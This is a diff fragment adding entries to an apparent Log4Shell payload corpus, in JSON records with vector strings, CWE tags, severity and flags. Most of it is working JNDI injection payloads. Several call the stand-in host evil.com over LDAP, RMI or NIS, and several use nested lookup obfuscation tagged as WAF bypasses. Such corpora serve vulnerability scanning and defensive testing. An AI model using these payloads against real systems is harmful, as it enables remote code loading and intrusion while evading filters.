+      "id": "log4shell.legacy.e5b9ab7a75",
+      "vector": "${k8s:namespaceName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.eb96741356",
+      "vector": "${ndc:}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.f249492f53",
+      "vector": "${java:locale}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.f34d659cf0",
+      "vector": "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.f42b31ba59",
+      "vector": "${ctx:}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.f54b4cfc89",
+      "vector": "${jndi:ldap://127.0.0.1/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.f6e53a2714",
+      "vector": "${j${::-ND}i${::-:}ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.f73c7827ba",
+      "vector": "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true,
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.fa28d90271",
+      "vector": "${jndi:nis://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.ff3be1e8d7",
+      "vector": "${java:runtime}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.ffe42aa827",
+      "vector": "${${::-j}ndi:rmi://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    }
+  ]
+}
